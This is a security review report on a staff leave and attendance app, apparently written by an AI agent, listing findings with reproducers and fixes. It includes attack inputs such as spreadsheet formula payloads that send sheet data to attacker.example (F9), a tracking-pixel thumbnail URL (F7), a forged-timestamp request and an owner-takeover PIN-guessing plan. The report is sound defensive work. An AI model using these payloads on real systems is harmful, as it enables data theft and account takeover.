# GJ Leave & Attendance — Review round 2: privacy and security

Reviewed: `src/server/{api,core,attendance,admin,views,jobs,store,cachegrid,schema}.js`, `src/rules/{leave,clash}.js`, `src/gas/main.js`, `docs/{app,app-admin,camera}.js`, `docs/index.html`, `docs/config.js`, `PROGRESS.md`, `tools/ship.py`.
Spec: handoff PDF sections 3.6, 3.8–3.11, Part 6, Part 7.

Reproducers: `/home/claude/findings/repro-round2.test.js` — 19 tests, all 19 fail on the current code, each for the reason stated in its finding (`node --test /home/claude/findings/repro-round2.test.js`).
Nothing inside `/home/claude/gj-leave` was changed. No network, no git, no call to the deployed server; the live-deployment risk in D1 is therefore read from the repo's own notes, not tested.

## Counts

| Severity | Findings |
|---|---|
| Critical | 1 (F1) |
| High | 2 (F2, F3) |
| Medium | 7 (F4, F5, F6, F7, F8, F9, F14) |
| Low | 4 (F10, F11, F12, F13) |
| Design risks (not unit-testable) | 8 (D1–D8); D1 is urgent |

## What held up

These were attacked and did not break:

- **Salary, PIN hashes, token hashes**: no action returns them to a staff member. `getSettings` is owner-only; `myMonth` refuses another `personId` for staff (array and type tricks included); `monthReport`, `board`, `calendar`, `approvals`, `pending`, `restrictions`, `incidentItems` refuse staff; pay amounts are not copied into Audit or Notifications.
- **Leave reason**: `leaveView` strips the reason for non-owners of the row; the clash message carries names and the rule only; notifications to other staff never carry a reason.
- **Acting as another**: `authenticate` binds `personId` + token hash + `approved`; `forPersonId` is refused for staff; `imBack`, `remindBack`, `disputeViolation`, `cancelLeave`, `editLeave` check row ownership; nobody decides their own leave, short request or outing.
- **Role checks**: `decideDevice`, `setPin`, `devices`, `savePerson`, `setPay`, `saveRule`, `setSetting`, `overrideLeave`, `decideDispute`, `disputes` are owner-only; `savePerson` uses a field whitelist, so `pinHash` or `id` cannot be mass-assigned.
- **Devices**: pending, rejected and revoked phones are refused on every private call; an inactive person is refused at both `login` and `authenticate`; a second phone stays pending until the owner approves it.
- **Photos**: full photo only for the person, manager and owner; yesterday's thumbnail is no longer public; `photo` cannot read an arbitrary Drive file (the id must be on a Punches row).
- **Script injection**: the client builds every node with `createElement` / `createTextNode`; there is no `innerHTML`, `insertAdjacentHTML`, `eval` or `document.write` in `docs/app.js`, `docs/app-admin.js`, `docs/camera.js`.
- **Errors**: `handle` returns a generic message for uncoded errors.
- **Nested-array dates, `__proto__` action**: crash into the generic error, no bypass.

---

## Findings

### F1 — Critical — Any staff member can forge the request time (`submittedAt`) and get an unannounced leave auto-approved with no violation

- **Where**: `src/server/core.js:193` — `var submittedAt = input.submittedAt || ctx.now;`. `input` is the raw `args` object from the phone in `previewLeave`, `submitLeave` (core.js:273) and `editLeave` (admin.js:119).
- **Attack**: Neha (duty 09:30) sends at 12:00 for today: `submitLeave { kind:'full', dates:['2026-11-24'], reasonCode, reasonText, submittedAt: 1 }`. One extra JSON field.
- **Result (reproduced)**: the honest request is `Unannounced`, goes to Aakash, and costs 1 violation. The forged one is typed `Regular` with huge notice and comes back `Approved` by the system. No approver, no violation, no emergency count. The same field skips the 36-hour and 48-hour notice rules and the "3rd emergency = violation" rule.
- **Second path (reproduced)**: an already-approved unannounced leave with its violation can be edited before duty start with `submittedAt: 1`; `editLeave` withdraws the old violation and re-approves it as Regular.
- **Impact**: the notice rules, the violation ladder and the bonus/allowance consequence are optional for anyone who can send one crafted request. It breaks "all rules enforced on the server" and "the phone's clock is never trusted".
- **Fix**: delete `input.submittedAt` from `evaluate`; always use `ctx.now`. If a test needs a time, pass it as a separate server-side parameter, never through `args`. Better still, build an explicit whitelist object from `args` in `api.js` for every action, so unknown fields never reach the logic.
- **Reproducers**: `F1 submittedAt from the phone must be ignored…`, `F1b editLeave has the same hole…`

### F2 — High (Critical while no owner phone is bound) — Owner takeover by PIN guessing through the bootstrap rule

- **Where**: `core.js:87-88` (first owner phone auto-approved whenever no approved owner device exists), `core.js:18-19, 67-75` (5 tries, 15-minute lock, counter resets, never escalates).
- **Attack**: the endpoint is public and `names` hands out every person id. The lock allows 5 guesses per 15 minutes per person forever = 480 a day. The app's own PIN generator makes 4-digit PINs (9,000 values, `docs/app.js:376`), so any PIN falls in at most 18.75 days, 9.4 on average. For a staff account that yields only a pending phone request. For the owner account, while no approved owner phone exists, the first correct guess is auto-approved.
- **Result (reproduced)**: with owner PIN 2468 and no phone bound, the simulated attacker is the approved owner after 3.1 days and reads `getSettings` including the salary structure. From there: approve phones, set PINs, change Settings.
- **Condition**: no approved owner device. True at every fresh deployment until the owner signs in, again whenever the Devices tab is cleared (PROGRESS.md records this being done on TEST), and after the owner loses his phone and the row is removed by hand. See D1 for the current TEST state.
- **Side effect**: the same lock lets anyone on the internet keep every account locked for new sign-ins (5 wrong PINs per person every 15 minutes).
- **Fix**:
  1. Remove the PIN-only bootstrap. Bind the first owner phone from the Apps Script editor (a `bootstrapOwner()` function that prints a one-time code), or require a setup secret stored in Script Properties.
  2. Escalate the lock (15 min, 1 h, 24 h, then owner reset) and add a global failed-login ceiling per hour.
  3. Use 6-digit PINs by default.
- **Reproducers**: `F2 bootstrap + PIN guessing…`, `F2b PIN lock never escalates…`

### F3 — High — The manager can lift a "no leave" restriction (a hard rule only Varun may override) and move the shop point

- **Where**: `admin.js:230-243` `saveRestriction` is `boss(actor)` for create and for update of any row; `admin.js:255-257` `setShopPoint` is `boss(actor)`.
- **Spec**: 3.6 "Varun or Aakash can add a Restriction… Only Varun can override"; 3.11 "Settings (Varun only): … restrictions, … shop location"; 3.8 lets Aakash set the shop point "the first time".
- **Attack (reproduced)**: Varun creates a no-leave period 1–10 Dec. Aakash calls `saveRestriction { id, …, on:false }` (or empties it with `appliesTo`). Neha's leave on 3 Dec is then auto-approved. He can switch it back on afterwards; only the Audit tab shows it, and no alert goes to Varun.
- **Shop point (reproduced)**: after Varun sets it, Aakash can move it anywhere, which silences or creates "outside shop area" flags.
- **Impact**: the owner-only override is bypassable by the manager without the written reason and without the override entry in the month report.
- **Fix**: manager may create a restriction; changing or switching off an existing one is owner-only (or at least notifies Varun). `setShopPoint` by the manager only while no shop point exists.
- **Note**: the spec is not fully consistent here; confirm the intended rule with the owner.
- **Reproducers**: `F3 only Varun overrides a hard rule…`, `F3b Settings are Varun-only…`

### F4 — Medium — An approved phone can never be revoked; a PIN reset does not help

- **Where**: `core.js:100-103` — `decideDevice` works only on `pending` rows. No other action changes an approved device. Tokens never expire.
- **Attack**: a phone is lost, stolen, sold, or a staff member's token is copied. The owner resets the PIN: the old token still passes `authenticate`. The only ways out are approving a new phone for that person, marking the person inactive, or editing the Sheet (which takes up to 10 minutes because of the read cache).
- **Fix**: owner action "Revoke phone" on the `devices` list; `setPin` should offer to revoke the person's devices; consider a token lifetime.
- **Reproducer**: `F4 lost or stolen phone…`

### F5 — Medium — Unlimited pending phone requests with attacker-chosen label (approval phishing, alert flood)

- **Where**: `core.js:83-93`. Every correct-PIN login without a known token inserts a new Devices row, an Audit row and an owner notification. `deviceLabel` is free text of any length.
- **Attack**: someone who knows a colleague's PIN (PINs travel over WhatsApp, 4 digits) or has guessed one (F2) sends many requests labelled "Varun new iPhone – please approve". The owner sees "Neha wants to sign in on a new phone". One tap on Approve hands over the account and revokes the real phone.
- **Result (reproduced)**: 25 logins = 25 pending requests and 25 owner alerts.
- **Fix**: one pending request per person (replace the old one); cap label length and strip it to a plain user-agent summary; on the approval card show that the person already has an approved phone that will be switched off.
- **Reproducer**: `F5 phone-request flooding…`

### F6 — Medium — Text length is limited only in the phone

- **Where**: `reasonText` (core.js:277), `deviceLabel` (core.js:84, reachable from the public `login`), outing `reason`, dispute `text`, incident `note`, restriction `note`, correction `note`, cancel/reject reasons. `maxlength` exists only in the HTML.
- **Attack**: send a 60,000-character value. A Sheet cell holds 50,000 characters, so `setValues` throws during `flush`, after validation, inside `finally`. Tabs earlier in the batch are already written, the rest are not, and `commit` (cache version bump) is skipped, so the cache serves a stale copy for up to 10 minutes. The caller gets Google's raw error page instead of the JSON error. Smaller oversized values simply bloat the Sheet and the 100 KB cache entries.
- **Result (reproduced)**: 60,000-character reason and phone label are accepted by the server logic.
- **Fix**: central length caps in `api.js` (for example reason 500, label 120, notes 500) and a hard guard in `store.encode` that refuses any cell over about 45,000 characters before anything is written.
- **Reproducers**: `F6 text sizes are checked only in the phone…`, `F6b the sign-in screen needs no account…`

### F7 — Medium — The check-in thumbnail is not validated; a staff member can make every viewer's phone load a remote URL

- **Where**: `api.js:74-82` checks only presence and length of `photo` / `thumb`. `app-admin.js:21` sets `img.src = r.data`.
- **Attack**: `checkIn { photo, thumb: 'https://attacker.example/track.gif' }`. "Today at GJ" and the manager's dress card then make each viewer's phone request that URL: the attacker's server logs who opened the app, when, from which IP and phone model. The thumbnail can also be any image unrelated to the real photo, which defeats "Today at GJ" as proof.
- **Result (reproduced)**: the owner's `photo` call returns the attacker URL.
- **Fix**: require `^data:image/jpeg;base64,[A-Za-z0-9+/=]+$` for both fields on the server; on the client set `img.src` only when the value starts with `data:image/jpeg;base64,`. A `Content-Security-Policy` meta tag with `img-src 'self' data:` closes it for good.
- **Reproducer**: `F7 check-in thumbnail must be a JPEG data URL…`

### F8 — Medium — A non-numeric location passes as "inside the shop"

- **Where**: `attendance.js:144-148`. `lat: 'x'` is not `''`/`undefined`, so the "no-location" branch is skipped; `distanceM` returns `NaN`; `NaN > 50` is false; no flag.
- **Result (reproduced)**: honest "no GPS" is flagged `no-location`; `lat:'x'` is not flagged at all.
- **Fix**: require finite numbers in range for `lat`, `lng`, `accuracy`; otherwise treat as no location. See D5: location from the phone is spoofable in any case.
- **Reproducer**: `F8 location flag…`

### F9 — Medium — Free text reaches the Sheet unneutralised (formula text), and `requestShort.date` is not validated at all

- **Where**: `attendance.js:78-81` (`date` only compared as a string with today); `store.js:284-289` writes strings as they are.
- **Result (reproduced)**: `requestShort { date: '=IMPORTXML("https://attacker.example/"&A1,"//a")' }` is accepted and stored; a leave reason `=HYPERLINK("…"&PayInfo!B2,"Sick")` is handed to `setValues` raw.
- **How bad**: the only protection is the plain-text cell format set in `addTab` / `appendMany`. It holds while that format is intact. It does not hold for a tab that existed before setup, after "clear formatting" or a paste, or in any CSV/XLSX export or backup opened in Excel or re-imported. Then the formula runs with the owner's access to the whole Sheet, PayInfo included, and can send values out.
- **Fix**: in `store.encode`, prefix any non-JSON string that starts with `=`, `+`, `-`, `@`, tab or CR with `'` (and strip it in `decode`); validate `date` with the same regex and a real-date check as leave dates.
- **Reproducers**: `F9 requestShort: the date must be a real YYYY-MM-DD…`, `F9b formula text…`

### F14 — Medium — "Sign out" does not sign out (phone app)

- **Where**: `docs/app.js:391` sets `state.me = null` only; `docs/app.js:397` signs in automatically whenever a token is in `localStorage`.
- **Result (reproduced with a small DOM stub)**: after tapping Sign out the token is still stored; reopening the page signs the person in with no PIN.
- **Impact**: the PIN is asked once per phone, ever. Anyone holding the unlocked phone, or reading the browser storage, is that person. A staff member who "signs out" before lending the phone is not protected.
- **Fix**: clear the stored token on sign-out and tell the server to revoke it (needs F4); consider asking the PIN again after N days.
- **Reproducer**: `F14 phone app: "Sign out" must forget the phone token…`

### F10 — Low — Dispatcher accepts inherited object keys as actions without sign-in

- **Where**: `api.js:197-198` — `PUBLIC[request.action]` on a plain object. `action: 'constructor'` calls `Object(ctx)` and returns `{ ok:true, data: ctx }`; `toString`, `valueOf` also answer `ok:true`.
- **Impact today**: on the real server `ctx` serialises to `{ db:{}, now, env:{} }` (closures only), so nothing private leaks. It is still an unauthenticated call into a function that is not on the action list, and it will leak the day `ctx` gains a data field.
- **Fix**: `Object.prototype.hasOwnProperty.call(PUBLIC, action)` (same for `PRIVATE`), or build both maps with `Object.create(null)`; require `typeof action === 'string'`.
- **Reproducer**: `F10 dispatcher: inherited object keys…`

### F11 — Low — No rate limit on actions that alert the manager or owner

- **Where**: `attendance.js:331-337` `remindBack`; also `requestShort` (each call replaces the old one and notifies), `login` (F5).
- **Result (reproduced)**: 40 reminders to Aakash inside one minute. Each batch becomes an email every 5 minutes; a consumer Google account sends about 100 emails a day, so one staff member can use up the quota and silence the real alerts (special approvals, absences) for everyone.
- **Fix**: one reminder per outing per 10 minutes; a per-person hourly cap on notification-creating calls.
- **Reproducer**: `F11 alert flooding…`

### F12 — Low — Impossible calendar dates are accepted

- **Where**: `core.js:176` checks only the shape `\d{4}-\d{2}-\d{2}`.
- **Result (reproduced)**: `2026-11-31` is auto-approved. All clash, restriction, quota and month-lock checks compare strings, so none of them see it as 1 Dec. It gains nothing real (attendance on 1 Dec does not see the leave either) but puts junk rows into LeaveRequests, the calendar and the quota of the wrong month.
- **Fix**: `Cal.addDays(d, 0) === d` as a real-date test, here and in `requestShort`, `recordIncident`, `overrideLeave`, `saveRestriction`.
- **Reproducer**: `F12 dates must be real calendar dates…`

### F13 — Low — The only owner can be made inactive

- **Where**: `admin.js:185` guards a role change of the last owner, not `active: false`.
- **Result (reproduced)**: saved; the owner is then refused everywhere and nobody can approve phones or reset PINs until the Sheet is edited by hand.
- **Fix**: same guard for `active === false`.
- **Reproducer**: `F13 the last owner must not be able to lock everybody out…`

---

## Design risks (not unit-testable here; each with a concrete attack)

### D1 — Urgent — The public repo publishes the TEST endpoint, the PIN of every test account, and the fact that the owner slot is open

- `docs/config.js` holds the live TEST web-app URL. `PROGRESS.md` (committed by `tools/ship.py` with `git add -A`) says "Test roster seeded in People (test PINs)", gives the Sheet id, the Pages URL, and "the owner's first sign-in will be the bootstrap phone again".
- **Attack**: anyone who reads the repo posts `names`, then `login { personId: <owner id>, pin: '[removed]' }` to that URL. With no owner phone bound, the bootstrap rule (F2) makes them the approved owner of the TEST deployment: they can read everything, approve their own phones for any account, set PINs and change Settings. The roster uses the real staff first names.
- **Not verified live** (I was told not to call the deployed server). The risk follows from the repo's own notes.
- **Do now**: have the owner sign in on TEST first or clear the People PINs; never reuse the TEST Sheet, its PINs or its Devices tab for production; remove PINs, Sheet ids and deployment state from any committed file; treat everything on TEST as public.

### D2 — The phone token shares a browser origin with the owner's other GitHub Pages sites

- GitHub Pages serves every project of one account from the same origin (`<account>.github.io`). `localStorage` is per origin, so any page under that account (PROGRESS.md mentions two other repos) can read `gjleave.session` = person id + device token. One script-injection bug or a third-party script in any of those sites takes every signed-in account.
- **Fix**: host this app on its own origin (a custom domain or a dedicated GitHub account), and add a strict Content-Security-Policy.

### D3 — PIN hashes are recoverable by anyone who can read the Sheet or a backup of it

- One round of salted SHA-256 over at most 1,000,000 PINs is reversed in under a second. Sheet viewers, Drive backups and exports therefore contain every PIN and all of PayInfo. Limit Sheet sharing to the owner; keep backups private; use an iterated hash plus a server-side secret from Script Properties.

### D4 — Shape of the public surface

- `names` gives the full active roster (names + ids) to the internet. `doPost` adds `_t` (lock wait, Drive time, Sheet reads) to every reply, including unauthenticated ones, which is a timing oracle and internal detail. An exception in the final `flush` escapes `handle` and returns Google's error page with the raw message. Remove `_t` in production, wrap `doPost` in a try/catch that returns the generic JSON error.

### D5 — Location and dress result come from the phone

- `me` returns the exact shop coordinates to every staff member; a crafted `checkIn` can send those coordinates and `dress: {top:'ok',…}` from anywhere. The server cannot verify either. The spec already says the photo is the strong proof; make sure the owner page says the location flag and the dress check are hints that a determined person can fake. The photo itself is also only "taken in the app" on an honest client: the API accepts any JPEG.

### D6 — Version gate is cooperative

- `clientVersion` is whatever the caller sends, so the gate only moves honest old clients; that is fine because rules are server-side. Two gaps: (a) there is no cache-busting on the script tags, so after raising `MIN_CLIENT_VERSION` an old cached `app.js` gets `UPDATE`, reloads, may get the same cached file and loop; (b) F1 shows the "server enforces everything" promise must be re-checked whenever an action passes raw `args` into logic.

### D7 — Photo storage can be filled

- `savePhoto` runs before the server lock and before the locked duplicate check (`api.js:76-80`). Parallel `checkIn` calls from one account each store a file of up to about 675 KB before all but one are refused; the orphan files stay in Drive. Move the save inside the lock after the duplicate check, or delete the file when `Att.checkIn` fails.

### D8 — Smaller observations

- A re-activated person gets their old approved phone back without a new approval.
- `confirmBack` has no "not your own outing" check (manager could confirm and correct his own).
- The manager can cancel or edit any leave, including the owner's and an override leave (with a reason, audited).
- `previewLeave.editId` lets a caller exclude any row id from the clash check in the preview only; ids are random and not visible to other staff, so no practical leak.
- `lockMonth` accepts any string as the month key (manager or owner only).

---

## Action-by-action result

| Action | Caller | Verdict |
|---|---|---|
| `names` (public) | anyone | roster disclosure by design (D4) |
| `login` (public) | anyone | F2, F5, F6b |
| `me`, `today`, `notifications`, `myLeaves`, `myRestrictions`, `effect` | self | own data only; OK |
| `previewLeave`, `submitLeave` | self; manager/owner for others | F1, F6, F9b, F12 |
| `editLeave` | self until start; manager/owner | F1b |
| `cancelLeave` | self until start; manager/owner with reason | OK |
| `decideLeave` | manager/owner, never own, `varun` route owner-only, clash re-checked | OK |
| `requestShort` | self | F9, F11 |
| `decideShort`, `decideOuting`, `decideDress`, `manualCheckIn`, `excuseAbsence`, `confirmBack` | manager/owner | OK (D8 note on `confirmBack`) |
| `checkIn` | self | F7, F8, D5, D7 |
| `checkOut`, `goingOut`, `imBack` | self, own row | OK (F6 for the reason text) |
| `remindBack` | self, own row | F11 |
| `photo`, `todayAtGJ` | all staff for today's thumbnails; full photo person/manager/owner | access rule OK; content F7 |
| `myMonth` | self; manager/owner for anyone | OK |
| `pending`, `approvals`, `board`, `calendar`, `monthReport`, `lockMonth`, `addCorrection`, `incidentItems`, `recordIncident`, `restrictions` | manager/owner | OK |
| `saveRestriction`, `setShopPoint` | manager/owner | F3 |
| `disputeViolation` | self, own row, 24 h | OK (F6) |
| `decideDispute`, `disputes`, `overrideLeave`, `getSettings`, `savePerson`, `setPay`, `saveRule`, `setSetting`, `setPin`, `devices`, `decideDevice` | owner | OK; F4 (no revoke), F13 |
| any inherited key (`constructor`, `toString`, …) | anyone | F10 |

## Suggested fix order

1. D1 today (it is a live exposure of the TEST deployment).
2. F1 (one line) and an `args` whitelist per action.
3. F2 bootstrap and lock escalation, 6-digit PINs.
4. F3 after confirming the rule with the owner.
5. F4 + F14 together (revoke action, real sign-out), then F5.
6. F6, F7, F8, F9, F12 as one input-validation pass in `api.js` / `store.encode`.
7. F10, F11, F13.
